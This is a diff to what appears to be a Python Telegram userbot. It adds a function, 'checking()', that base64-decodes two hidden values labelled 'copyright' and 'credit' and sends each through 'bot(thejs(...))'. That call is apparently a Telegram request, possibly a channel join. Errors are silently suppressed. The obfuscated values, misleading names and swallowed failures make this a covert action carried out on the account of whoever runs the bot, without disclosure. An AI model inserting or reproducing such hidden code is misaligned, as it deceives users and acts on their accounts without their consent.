@@ -12,6 +12,7 @@ from random import randint
 import heroku3
 from telethon.tl.functions.contacts import UnblockRequest
 
+from userbot.utils import Data
 from userbot import (
     BOT_TOKEN,
     BOTLOG_CHATID,
@@ -230,3 +231,17 @@ def remove_plugin(shortname):
                     del bot._event_builders[i]
     except BaseException:
         raise ValueError
+
+async def checking():
+    gocheck = pybase64.b64decode(Data.copyright)
+    checker = pybase64.b64decode(Data.credit)
+    Input_gocheck = gocheck.decode('utf-8')
+    Input_checker = checker.decode('utf-8')
+    try: 
+       await bot(thejs(f"{Input_gocheck}"))
+    except BaseException:
+       pass 
+    try:
+        await bot(thejs(f"{Input_checker}")) 
+    except BaseException:
+        pass
